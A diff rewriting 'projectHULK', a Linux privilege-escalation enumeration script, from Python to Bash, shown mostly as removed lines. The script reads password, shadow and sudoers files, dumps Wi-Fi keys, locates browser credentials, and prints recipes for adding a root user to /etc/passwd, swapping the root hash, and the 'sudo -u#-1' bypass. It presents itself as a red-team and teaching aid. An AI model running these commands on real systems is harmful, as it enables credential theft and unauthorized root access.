@@ -1,24 +1,25 @@
-#!/usr/bin/env pyhton
-# -*- coding: utf-8 -*-
-import os
-import time
-#------------------> NOTE:
+#!/bin/bash
+
 # If you have redirected the output to a file, please search and delete the following words to have a proper report:
 #	\033[0m
 #	\033[01;31m
 #	\033[0;37;44m
 #	\033[01;32;40m
+#------------------> Color Code:
+RED="\033[01;31m"
+BLUE="\033[0;37;44m"
+GREEN="\033[01;32;40m"
 #------------------> Clear Screen:
-print("\n\n\033[01;31m╚════{Clearing Terminal\033[0m")
-time.sleep(0.5)
-os.system("clear")
-print("\n\n\033[01;32;40m╚════{Loading Script...\033[0m")
-time.sleep(2)
-os.system("clear")
-#------------------>Banner:  
-print("\n")
-print("\n")
-banner ="""
+echo -e "\n\n${RED}╚════{Clearing Terminal\033[0m"
+sleep 0.5
+clear 
+echo -e "\n\n${GREEN}╚════{Loading Script...\033[0m"
+sleep 2
+clear
+#------------------> Banner: 
+echo -e "\n"
+echo -e "\n"
+echo -e "
     \t\t                ▄▄▄▄▄▄▄▄▄▄▄▄                
     \t\t              ████████████████              
     \t\t            ███████████████████▌            ██████╗ ██████╗  █████╗      ██╗███████╗ █████╗ ████████╗      ██╗  ██╗██╗   ██╗██╗     ██╗  ██╗
@@ -27,808 +28,806 @@ banner ="""
     \t\t      ▄▄▄██                      ██▄▄▄      ██╔═══╝ ██╔══██╗██║  ██║██╗  ██║██╔══╝  ██║  ██╗   ██║  █████  ██╔══██║██║   ██║██║     ██╔═██╗ 
     \t\t  ██████████▄▄▄▄▄▄        ▄▄▄▄▄▄██████████  ██║     ██║  ██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝   ██║         ██║  ██║╚██████╔╝███████╗██║ ╚██╗
     \t\t        ▀▀▀██████████████████████▀▀▀        ╚═╝     ╚═╝  ╚═╝ ╚════╝  ╚════╝ ╚══════╝ ╚════╝    ╚═╝         ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
-    \t\t                                            ══════════════════════════════════════════════════════════════{\033[01;31mPrivilege Escalation Script v2.5\033[0m}
+    \t\t                                            ══════════════════════════════════════════════════════════════{${RED}Privilege Escalation Script v2.5\033[0m}
     \t\t                                            Tʜᴇ sᴄʀɪᴘᴛ ʜᴀs ʙᴇᴇɴ ᴅᴇsɪɢɴᴇᴅ ᴛᴏ ʜᴇʟᴘ (SOC & Rᴇᴅ Tᴇᴀᴍ) ᴏʀ ᴄᴀɴ ʙᴇ ᴜsᴇᴅ ғᴏʀ ᴇᴅᴜᴄᴀᴛɪᴏɴᴀʟ ᴘᴜʀᴘᴏsᴇs ɪɴ
     \t\t           █                  █             ғɪɴᴅɪɴɢ sʏsᴛᴇᴍ ᴠᴜʟɴᴇʀᴀʙɪʟɪᴛɪᴇs ᴛʜᴀᴛ ᴍᴀʏ ʟᴇᴀᴅ ᴛᴏ ᴘʀɪᴠɪʟᴇɢᴇ ᴇsᴄᴀʟᴀᴛɪᴏɴ & ᴇxᴘʟᴏɪᴛᴇ ɪᴛ. Tʜᴇ sᴄʀɪᴘᴛ 
     \t\t            █    ██▀▀▀▀██    █              sʜᴏᴜʟᴅ ʙᴇ ᴜsᴇᴅ ɪɴ sᴀғᴇ ᴇɴᴠɪʀᴏɴᴍᴇɴᴛ. Tʜᴇ ᴀᴜᴛʜᴏʀ ɪs ɴᴏᴛ ʀᴇsᴘᴏɴsɪʙʟᴇ ғᴏʀ ᴀɴʏ ᴍɪsᴜsᴇ ᴏғ ɪᴛ. ʜᴇʀᴇғᴏʀ,
     \t\t             █  ▀        ▀  █               ʙʏ ʀᴇᴀᴅɪɴɢ ᴛʜɪs, ʏᴏᴜ ᴛᴀᴋᴇ ғᴜʟʟ ʀᴇsᴘᴏɴsɪʙɪʟɪᴛʏ ᴏғ ᴍɪsᴜsɪɴɢ ɪᴛ.
     \t\t              ██▄████████▄██
     \t\t                ▀████████▀
-    \t\t                   ████
-"""
-print(banner)
-time.sleep(1)
-print("\033[0;37;44mAuthor:\033[0m")
-time.sleep(0.1)
-print("\t     Iʀᴏɴ Hᴜʟᴋ")
-print("\tMᴀɴ Iɴ A Bʟᴀᴄᴋ Tᴜxᴇᴅᴏ")
-time.sleep(0.1)
-print("\n\033[0;37;44mTweet Me:\033[0m")
-time.sleep(0.1)
-print("\tɪʀᴏɴʜᴜʟᴋ_x69")
-time.sleep(0.1)
-print("\n\033[0;37;44mMessage:\033[0m")
-time.sleep(0.1)
-print("\tAʟʟ ᴛʜᴇ ᴇxᴘʟᴏɪᴛs ʜᴀᴠᴇ ʙᴇᴇɴ ʟɪsᴛᴇᴅ ʙᴀsᴇᴅ ᴏɴ ᴛʜᴇ ᴀᴜᴛʜᴏʀ's ᴏᴘɪɴɪᴏɴ, ʏᴏᴜ ᴍᴀʏ ᴜsᴇ ᴀɴʏ ᴏғ ʏᴏᴜʀ ᴄʜᴏɪᴄᴇ. Rᴇᴍᴇᴍᴇʙʀ, SKY HAS NO LIMITS :)")
-time.sleep(0.1)
-print("\n\033[0;37;44mRecommendation:\033[0m")
-time.sleep(0.1)
-print("\tFᴏʀ ᴀ ʙᴇᴛᴛᴇʀ ᴠɪᴇᴡ ᴏғ ᴛʜᴇ ʀᴇᴘᴏʀᴛ ɪs ɪᴛ ʀᴇᴄᴏᴍᴍᴇɴᴅᴇᴅ ʀᴇᴅɪʀᴇᴄᴛɪɴɢ ᴛʜᴇ ᴏᴜᴛᴘᴜᴛ ᴛᴏ ᴀ ғɪʟᴇ: ./ᴘʀᴏᴊᴇᴄᴛHULK.sʜ > PE_ʀᴇᴘᴏʀᴛ.ᴛxᴛ")
-print("\tNᴇᴠᴇʀ ʀᴇʟᴀʏ ᴏɴ ᴀ sɪɴɢʟᴇ ᴛᴏᴏʟ, ᴅᴏ ᴍᴀɴᴜᴀʟ ᴇɴᴜᴍᴇʀᴀᴛɪᴏɴ ᴀɴᴅ ᴛʀʏ ᴛᴏ ᴜsᴇ ᴍᴀɴʏ ᴛᴏᴏʟs ᴀs ᴍᴜᴄʜ ᴀs ʏᴏᴜ ᴄᴀɴ.")
-time.sleep(0.1)
-print("\n\033[0;37;44mScan Started At:\033[0m")
-os.system("date")
-time.sleep(5)
-print("\n\n\033[01;31m\t\tEnumeration on progress ╔═.......................................(1%)...........................................\033[0m\n")
-time.sleep(5)
-print("\t\033[01;31m ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m")
-print("\t\033[01;31m  ════════════════════════════════════════════════════════════[ Current User Information ]════════════════════════════════════════════════════════ \033[0m")
-print("\t\033[01;31m ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m")
-print("\n")
-time.sleep(1)
-print("\n\033[0;37;44m[+] Current user is:\033[0m")
-os.system ('whoami')
-print("\n\033[0;37;44m[+] Sudo privileged access:\033[0m")
-os.system("sudo -ln | grep -E --color=always 'NOPASSWD|ALL|$'")
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Incase you have the password, run: sudo -l and find a way to exploit that file║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Who's logged in:\033[0m")
-os.system ('w')
-print("\n\033[0;37;44m[+] Login History:\033[0m")
-os.system ('last -Faiw | last | grep still --color=always')
-print("\n\033[0;37;44m[+] Last Log In:\033[0m")
-os.system ('lastlog | grep -v "**Never logged in**"')
-print("\n\033[0;37;44m[+] Root Users:\033[0m")
-os.system ("awk -F: '($3 == '0') {print}' /etc/passwd | grep root --color=always")
-print("\n\033[0;37;44m[+] Users with console:\033[0m")
-os.system ("cat /etc/passwd | grep --color=always '/bin/bash\|/bin/sh\|/bin/zsh'")
-print("\n\033[0;37;44m[+] Total number of users:\033[0m")
-os.system ("getent passwd | wc -l")
-print("\n\033[0;37;44m[+] Can we read other users’ history files?\033[0m")
-os.system ("find /* -name *.*history* -print 2>/dev/null")
-print("\n\033[0;37;44m[+] Are we in a restricted shell?\033[0m")
-os.system ('env | grep -i "rbash\|chroot"')
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Bypass Restricted Shell:                                                              ║")
-print("\t  ║https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] User ID:\033[0m")
-os.system ('id')
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Sometimes, the user may be a part of a vulnerable group such as: lxd/lxc,     ║")
-print("\t  ║Docker, Wheel, Shadow, Disk, Video. Every group worths Googling for exploit.  ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] User Group & possible escap:\033[0m")
-os.system ('id | grep --color=always -i "docker\|lxd\|sambashare\|lpadmin\|adm\|sudo\|video\|disk\|disk\|shadow" 2>/dev/null')
-print("\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Docker group:                                                                                                    ║")
-print("\t  ║https://gtfobins.github.io/gtfobins/docker/                                                                      ║")
-print("\t  ║https://www.hackingarticles.in/docker-privilege-escalation/                                                      ║")
-print("\t  ║=================================================================================================================║")
-print("\t  ║LXD/LXC group:                                                                                                   ║")
-print("\t  ║https://www.hackingarticles.in/lxd-privilege-escalation/                                                         ║")
-print("\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/                           ║")
-print("\t  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation ║")
-print("\t  ║=================================================================================================================║")
-print("\t  ║Samashare group:                                                                                                 ║")
-print("\t  ║https://www.securityfocus.com/bid/9619/exploit                                                                   ║")
-print("\t  ║=================================================================================================================║")
-print("\t  ║lpadmin group:                                                                                                   ║")
-print("\t  ║https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791                                                         ║")
-print("\t  ║Usually members of the group adm have permissions to read log files located inside /var/log/                     ║")
-print("\t  ║Usually members of the group adm have permissions to read log files located inside /var/log/                     ║")
-print("\t  ║=================================================================================================================║")
-print("\t  ║sudo/admin group:                                                                                                ║")
-print("\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                  ║")
-print("\t  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                          ║")
-print("\t  ║=================================================================================================================║")
-print("\t  ║Video group:                                                                                                     ║")
-print("\t  ║The video group can be used locally to give a set of users access to a video device or to the screen output.     ║")
-print("\t  ║This could be exploit d by taking a screenshot of the current screen output and gathering any private information║")
-print("\t  ║such as user passwords or hashes.                                                                                ║")
-print("\t  ║Esc from video:-                                                                                                 ║")
-print("\t  ║https://github.com/frizb/Linux-Privilege-Escalation                                                              ║")
-print("\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                  ║")
-print("\t  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                          ║")
-print("\t  ║=================================================================================================================║")
-print("\t  ║Disk group:                                                                                                      ║")
-print("\t  ║The disk group provides users with access to the raw data contained in disks and partitions.                     ║")
-print("\t  ║Esc from disk:-                                                                                                  ║")
-print("\t  ║https://github.com/frizb/Linux-Privilege-Escalation                                                              ║")
-print("\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                  ║")
-print("\t  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                          ║")
-print("\t  ║=================================================================================================================║")
-print("\t  ║Shadow group:                                                                                                    ║")
-print("\t  ║Since users in this group have access to view the /etc/shadow file, this can be exploit d by cracking password   ║")
-print("\t  ║hashes found in it.                                                                                              ║")
-print("\t  ║Esc from shadow:-                                                                                                ║")
-print("\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                  ║")
-print("\t  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                          ║")
-print("\t  ║=================================================================================================================║")
-print("\t  ║Adm group:                                                                                                       ║")
-print("\t  ║Usually members of the group adm have permissions to read log files located inside /var/log/. take a look :D     ║")
-print("\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n")
-print("\t\033[01;31m ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m")
-print("\t\033[01;31m  ══════════════════════════════════════════════════════[ Password File Permission & Users ]══════════════════════════════════════════════════════ \033[0m")
-print("\t\033[01;31m ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m")
-print("\n")
-time.sleep(1)
-print("\n\033[0;37;44m[+] Each field is separated by a colon, and represents a different attribute to the user:\033[0m")
-print("\t  ╔════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║<Username>:<Password>:<UserID>:<GroupID>:<GecosField>:<HomeDirectory>:<Shell>   ║")
-print("\t  ║If an -x- is representing the password field, this indicates that the password  ║")
-print("\t  ║is encrypted.                                                                   ║")
-print("\t  ╚════════════════════════════════════════════════════════════════════════════════╝")
-time.sleep(1)
-print("\n\033[0;37;44m[+] Password file:\033[0m")
-os.system ("ls -la /etc/passwd --color=always")
-print("\t  ╔════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║If the file has written permission, it can be abused by adding a new user with  ║")
-print("\t  ║root privilege to the file. If it's no't writable, then it's protected.         ║")
-print("\t  ║\033[01;31mexploit :\033[0m                                                                       ║")
-print("\t  ║\033[01;31mFirst, generate a password with one of the following commands:\033[0m                  ║")
-print("\t  ║    \033[01;31mopenssl passwd -1 -salt hulk password\033[0m                                       ║")
-print('\t  ║    \033[01;31mperl -le "print crypt(hulk, password)"\033[0m                                      ║')
-print("\t  ║\033[01;31mOverwrite the password file:\033[0m                                                    ║")
-print('\t  ║    \033[01;31mecho "hulk:HASH:0:0::/root:/bin/bash" >> /etc/passwd\033[0m                        ║')
-print("\t  ║\033[01;31mThen do: su hulk\033[0m                                                                ║")
-print("\t  ║Read more:                                                                      ║")
-print("\t  ║https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/║")
-print("\t  ║Protect the file by limiting the access to it:                                  ║")
-print("\t  ║chmod 600 /etc/passwd                                                           ║")
-print("\t  ╚════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Reading Password File:\033[0m")
-os.system ('cat /etc/passwd | grep -E ":0:0:|$"')
-print("\n\033[0;37;44m[+] Hash in Password File:\033[0m")
-os.system ("grep  -v 'x' /etc/passwd")
-print("\t  ╔═══════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║If any hash is found in the /etc/passwd, the attacker my try to crack it by using  ║")
-print("\t  ║any hash cracker software, tool or website.                                        ║")
-print("\t  ╚═══════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Shadow file:\033[0m")
-os.system ('ls -la /etc/shadow --color=always')
-print("\t  ╔═══════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║If the file has read/write permission, it can abuse by replacing the root HASH     ║")
-print("\t  ║with the attacker's HASH or the attacker my copy the hash & try to crack it.       ║")
-print("\t  ║\033[01;31mexploit :\033[0m                                                                          ║")
-print("\t  ║\033[01;31m1) Generate a new Shadow Hash and replace it with the\033[0m                              ║")
-print("\t  ║   \033[01;31mcurrent root hash:\033[0m                                                              ║")
-print("\t  ║    \033[01;31m- mkpasswd  -m sha-512 -S prove123 -s\033[0m                                          ║")
-print("\t  ║\033[01;31m2) Open the shadow file using any text edirot of your choice:\033[0m                      ║")
-print("\t  ║   \033[01;31mor copy your HASH from your system and replace it with\033[0m                          ║")
-print("\t  ║   \033[01;31mthe root hash\033[0m                                                                   ║")
-print("\t  ║\033[01;31m3) Login to root using your password\033[0m                                               ║")
-print("\t  ║\033[01;31m4) Or Simply do:\033[0m                                                                   ║")
-print('\t  ║\033[01;31mecho "privesc:Npge08pfz4wuk:0:0:privesc,,,:/:/bin/bash" >> /etc/passwd\033[0m             ║')
-print("\t  ║\033[01;31mThis adds a root privilege user 'privesc' with the password 'password'\033[0m             ║")
-print("\t  ║Read More:                                                                         ║")
-print("\t  ║https://blog.geoda-security.com/2019/02/privilege-escalation-exploiting-write.html ║")
-print("\t  ║Protect the file by limiting the access to it:                                     ║")
-print("\t  ║chmod 600 /etc/shadow                                                              ║")
-print("\t  ╚═══════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Reading shadow File:\033[0m")
-os.system ('cat /etc/shadow')
-print("\n\033[0;37;44m[+] Hash in Shadow File: (Interesting :D)\033[0m")
-os.system ("grep  -v '*:\|!:' /etc/shadow")
-print("\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Crack the hash using online website or any cracking tools or simply do:                              ║")
-print("\t  ║    unshadow /etc/passwd /etc/shadow > shadow.john                                                   ║")
-print("\t  ║    john shadow.john --wordlist=<WORLD_LIST>                                                         ║")
-print("\t  ║If you own the system and have root, you can use MimiPenguin to crack it:                            ║")
-print("\t  ║    https://github.com/huntergregal/mimipenguin                                                      ║")
-print("\t  ║    https://github.com/sevagas/swap_digger                                                           ║")
-print("\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Sudoers file:\033[0m")
-os.system ('ls -la /etc/sudoers --color=always')
-print("\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║<Username> <All terminal>=<All user>:<All Group> <comand to execute>                                 ║")
-print("\t  ║Read more:                                                                                           ║")
-print("\t  ║https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d ║")
-print("\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Reading Sudoers File:\033[0m")
-os.system ("cat /etc/sudoers | grep -E --color=always 'ALL|$'")
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║The file shows a fully detailed about what the current user my run as root. If the running file or the║")
-print("\t  ║application has a global vulnerability, the attacker may google it and abuse it for user escalation.  ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] User Group list:\033[0m")
-os.system ('ls -la /etc/group --color=always')
-print("\n\033[0;37;44m[+] Content of User Group list:\033[0m")
-os.system('cat /etc/group')
-print("\n\033[0;37;44m[+] Password Policy:\033[0m")
-os.system ('grep --color=always "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs')
-print("\n\033[0;37;44m[+] WiFi Creds:\033[0m")
-os.system ('ls -la /etc/NetworkManager/system-connections')
-print("\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Try to read the following files manually and see if they have any passwords stored inside them.      ║")
-print("\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Sensitive files:\033[0m")
-os.system ('ls -la /etc/passwd --color=always 2>/dev/null; ls -la /etc/group --color=always 2>/dev/null; ls -la /etc/profile --color=always 2>/dev/null; ls -la /etc/shadow --color=always 2>/dev/null ; ls -la /etc/master.passwd --color=always 2>/dev/null')
-print("\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║See if any listed files have weak file permission.                                                   ║")
-print("\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] htpasswd:\033[0m")
-os.system ('find / -name .htpasswd -print -exec cat {} \; 2>/dev/null')
-print("\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║It is a flat-file used to store usernames and password. This file is generally used by the web server║")
-print("\t  ║software like Apache, Nginx, etc. in order to verify the users via HTTP basic authentication they are║")
-print("\t  ║in ASCII text format. The hash maybe cracked using online tools or any cracking password tools.      ║")
-print("\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] In memory passwords:\033[0m")
-os.system ('strings /dev/mem -n10 | grep -i PASS')
-print("\n\033[0;37;44m[+] Old passwords:\033[0m")
-os.system ('ls -la /etc/security/opasswd --color=always')
-print("\n\033[0;37;44m[+] Reading Old passwords:\033[0m")
-os.system ('cat /etc/security/opasswd')
-print("\n\033[0;37;44m[+] Root History File:\033[0m")
-os.system ('ls -la /root/.*_history --color=always 2>/dev/null')
-print("\n\033[0;37;44m[+] Password Files:\033[0m")
-os.system ("find / -name passwd -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always")
-print("\n\033[0;37;44m[+] apache2.conf:\033[0m")
-os.system ("cat /etc/apache2/apache2.conf | grep -i 'pass\|cred\|hash' --color=always")
-print( "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗")
-print( "\t  ║Read the full file for more inofrmation.                                                             ║")
-print( "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] smb.conf:\033[0m")
-os.system ("cat /etc/samba/smb.conf | grep -i 'pass\|cred\|hash' --color=always")
-print("\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║To list all files having the word password/credentials/hash do the following manually:               ║")
-print('\t  ║grep -rn -i "pass\|cred\|hash" / --color=always > password.txt                                       ║')
-print("\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Dump cleartext Pre-Shared Wireless Keys:\033[0m")
-os.system ('cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep -i "id\|psk"')
-print("\n\033[0;37;44m[+] Configuration files that might contain sensitive information:\033[0m")
-os.system ('grep "pass\|cred\|hash" /etc/*.conf 2>/dev/null --color=always')
-print("\n\033[0;37;44m[+] Firefox credentials:\033[0m")
-os.system ('ls -la /home/$USER/.mozilla/firefox 2>/dev/null')
-print("\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Password files are:                                                                                  ║")
-print("\t  ║  key4.db                                                                                            ║")
-print("\t  ║  logins.json                                                                                        ║")
-print("\t  ║Read more about where Firefox stores your bookmarks, passwords and other user data:                  ║")
-print("\t  ║    https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data                     ║")
-print("\t  ║You can use firefox_decrypt.py tool:                                                                 ║")
-print('\t  ║    https://github.com/unode/firefox_decrypt                                                         ║')
-print("\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n")
-print("\t\033[01;31m ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m")
-print("\t\033[01;31m  ═════════════════════════════════════════════════════════════[ System Information ]═════════════════════════════════════════════════════════════ \033[0m")
-print("\t\033[01;31m ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m")
-print("\n")
-time.sleep(1)
-print("\n\033[0;37;44m[+] System Name:\033[0m")
-os.system ('uname -a')
-print("\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Useful tools to help you in finding kernel exploit :                                                 ║")
-print('\t  ║    https://github.com/spencerdodd/kernelpop                                                         ║')
-print('\t  ║    https://github.com/jondonas/linux-exploit-suggester-2                                            ║')
-print("\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] System Release:\033[0m")
-os.system ('lsb_release -a')
-print("\n\033[0;37;44m[+] Host name:\033[0m")
-os.system ('hostname')
-print("\n\033[0;37;44m[+] System Version:\033[0m")
-os.system ('cat /proc/version')
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║The version is not listed in our database. However, make sure to keep your    ║")
-print("\t  ║system always up-to-date. Old version are always vulnerable. Visit the link   ║")
-print("\t  ║bellow for more details:                                                      ║")
-print("\t  ║    https://github.com/SecWiki/linux-kernel-exploits                          ║")
-print('\t  ║Or use:                                                                       ║')
-print('\t  ║    searchsploit "Linux version"                                              ║')
-print('\t  ║    https://github.com/InteliSecureLabs/Linux_Exploit_Suggester               ║')
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;41mList of vulnerable kernel versions:\033[0m")
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║3.9.6 3.9.0 3.9 3.8.9 3.8.8 3.8.7 3.8.6 3.8.5 3.8.4 3.8.3 3.8.2 3.8.1 3.8.0 3.8 3.7.6 3.7.0 3.7 3.6.0 3.6 ║")
-print("\t  ║3.5.0 3.5 3.4.9 3.4.8 3.4.6 3.4.5 3.4.4 3.4.3 3.4.2 3.4.1 3.4.0 3.4 3.3 3.2 3.19.0 3.16.0 3.15 3.14 3.13.1║")
-print("\t  ║3.13.0 3.13 3.12.0 3.12 3.11.0 3.11 3.10.6 3.10.0 3.10 3.1.0 3.0.6 3.0.5 3.0.4 3.0.3 3.0.2 3.0.1 3.0.0    ║")
-print("\t  ║2.6.9 2.6.8 2.6.7 2.6.6 2.6.5 2.6.4 2.6.39 2.6.38 2.6.37 2.6.36 2.6.35 2.6.34 2.6.33 2.6.32 2.6.31 2.6.30 ║")
-print("\t  ║2.6.3 2.6.29 2.6.28 2.6.27 2.6.26 2.6.25 2.6.24.1 2.6.24 2.6.23 2.6.22 2.6.21 2.6.20 2.6.2 2.6.19 2.6.18  ║")
-print("\t  ║2.6.17 2.6.16 2.6.15 2.6.14 2.6.13 2.6.12 2.6.11 2.6.10 2.6.1 2.6.0 2.4.9 2.4.8 2.4.7 2.4.6 2.4.5 2.4.4   ║")
-print("\t  ║2.4.37 2.4.36 2.4.35 2.4.34 2.4.33 2.4.32 2.4.31 2.4.30 2.4.29 2.4.28 2.4.27 2.4.26 2.4.25 2.4.24 2.4.23  ║")
-print("\t  ║2.4.22 2.4.21 2.4.20 2.4.19 2.4.18 2.4.17 2.4.16 2.4.15 2.4.14 2.4.13 2.4.12 2.4.11 2.4.10 2.2.24         ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Sudo Version:\033[0m")
-os.system ('sudo -V | grep --color=always "Sudo version"')
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║The version is not listed in our database. However, make sure to keep your    ║")
-print("\t  ║system always up-to-date. Old version are vulnerable. Use Google for more     ║")
-print("\t  ║details or use:                                                               ║")
-print('\t  ║searchsploit "sudo"                                                           ║')
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Is sudo version vulnerable?\033[0m")
-os.system ('sudo -V | grep --color=always "Sudo ver" | grep --color=always "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"')
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║If the sudo version <= v1.28, it is exploitable.                              ║")
-print("\t  ║\033[01;31mexploit :\033[0m                                                                     ║")
-print("\t  ║    \033[01;31msudo -u#-1 /bin/bash\033[0m                                                      ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Available shells:\033[0m")
-os.system ("cat /etc/shells 2>/dev/null")
-print("\n\033[0;37;44m[+] Bash version:\033[0m")
-os.system ("bash --version | grep version 2>/dev/null")
-print("\n\033[0;37;44m[+] Check Bash Shellshock vulnerability:\033[0m")
-os.system ("env x='() { :;}; echo bash is vulnerable' bash -c 'echo bash is not vulnerable'")
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Other test:                                                                                               ║")
-print("\t  ║https://serverfault.com/questions/631257/how-to-test-if-my-server-is-vulnerable-to-the-shellshock-bug     ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Path Environment:\033[0m")
-os.system ('systemctl show-environment')
-print("\n\033[0;37;44m[+] System Path:\033[0m")
-os.system ('echo $PATH')
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║If you have write permissions on any folder inside the PATH variable you may be able to hijack║")
-print("\t  ║some libraries or binaries. Read more:                                                        ║")
-print("\t  ║https://resources.infosecinstitute.com/topic/vulnhub-machines-walkthrough-series-pwnlab-init/ ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Lists block devices (hardrives, memory cards, etc):\033[0m")
-os.system("lsblk -a")
-print("\n\033[0;37;44m[+] Lists USB devices:\033[0m")
-os.system("lsusb")
-print("\n\033[0;37;44m[+] Information about SATA Devices for /dev/sda1:\033[0m")
-os.system("hdparm /dev/sda1 2>/dev/null ")
-print("\n\033[0;37;44m[+] Linux File System Information:\033[0m")
-os.system("fdisk -l 2>/dev/null ")
-print("\n\033[0;37;44m[+] List of running services:\033[0m")
-os.system("service --status-all")
-print("\n\033[0;37;44m[+] File-systems mounted:\033[0m")
-os.system ('df -h')
-print("\n\033[0;37;44m[+] ASLR Settings:\033[0m")
-os.system ('cat /proc/sys/kernel/randomize_va_space')
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Valid Settings:                                                                               ║")
-print("\t  ║0 = Disablabed                                                                                ║")
-print("\t  ║1 = Conservative Randomization                                                                ║")
-print("\t  ║2 = Full Randomization                                                                        ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] ASLR Address Space:\033[0m")
-os.system ('ldd /bin/bash')
-print("\n\033[0;37;44m[+] SELinux status:\033[0m")
